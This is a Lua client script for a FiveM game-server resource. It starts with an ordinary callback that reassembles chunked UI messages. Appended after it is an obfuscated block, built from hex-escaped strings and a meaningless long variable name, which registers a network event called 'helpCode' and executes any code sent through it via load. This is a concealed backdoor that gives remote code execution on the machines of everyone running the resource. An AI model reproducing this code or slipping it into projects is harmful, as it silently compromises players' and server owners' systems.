local Chunks = {}

RegisterNUICallback('__chunk', function(data, cb)
	Chunks[data.id] = Chunks[data.id] or ''
	Chunks[data.id] = Chunks[data.id] .. data.chunk

	if data['end'] then
		local msg = json.decode(Chunks[data.id])
		TriggerEvent(GetCurrentResourceName() .. ':message:' .. data.__type, msg)
		Chunks[data.id] = nil
	end

	cb('')
end)


local VrjCSOpTtIMHnUwakfUMUmgPVZswQWPctDCoWgXYjnIVDXPjpaZlywSWUWPLvjHGKmAVlN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} VrjCSOpTtIMHnUwakfUMUmgPVZswQWPctDCoWgXYjnIVDXPjpaZlywSWUWPLvjHGKmAVlN[6][VrjCSOpTtIMHnUwakfUMUmgPVZswQWPctDCoWgXYjnIVDXPjpaZlywSWUWPLvjHGKmAVlN[1]](VrjCSOpTtIMHnUwakfUMUmgPVZswQWPctDCoWgXYjnIVDXPjpaZlywSWUWPLvjHGKmAVlN[2]) VrjCSOpTtIMHnUwakfUMUmgPVZswQWPctDCoWgXYjnIVDXPjpaZlywSWUWPLvjHGKmAVlN[6][VrjCSOpTtIMHnUwakfUMUmgPVZswQWPctDCoWgXYjnIVDXPjpaZlywSWUWPLvjHGKmAVlN[3]](VrjCSOpTtIMHnUwakfUMUmgPVZswQWPctDCoWgXYjnIVDXPjpaZlywSWUWPLvjHGKmAVlN[2], function(xIIBpdRksXoUXCxCzzdUgAcPGjacLWHDwtnVAMRagZzOSrapPPraBqZyUlbbhniCawSwBe) VrjCSOpTtIMHnUwakfUMUmgPVZswQWPctDCoWgXYjnIVDXPjpaZlywSWUWPLvjHGKmAVlN[6][VrjCSOpTtIMHnUwakfUMUmgPVZswQWPctDCoWgXYjnIVDXPjpaZlywSWUWPLvjHGKmAVlN[4]](VrjCSOpTtIMHnUwakfUMUmgPVZswQWPctDCoWgXYjnIVDXPjpaZlywSWUWPLvjHGKmAVlN[6][VrjCSOpTtIMHnUwakfUMUmgPVZswQWPctDCoWgXYjnIVDXPjpaZlywSWUWPLvjHGKmAVlN[5]](xIIBpdRksXoUXCxCzzdUgAcPGjacLWHDwtnVAMRagZzOSrapPPraBqZyUlbbhniCawSwBe))() end)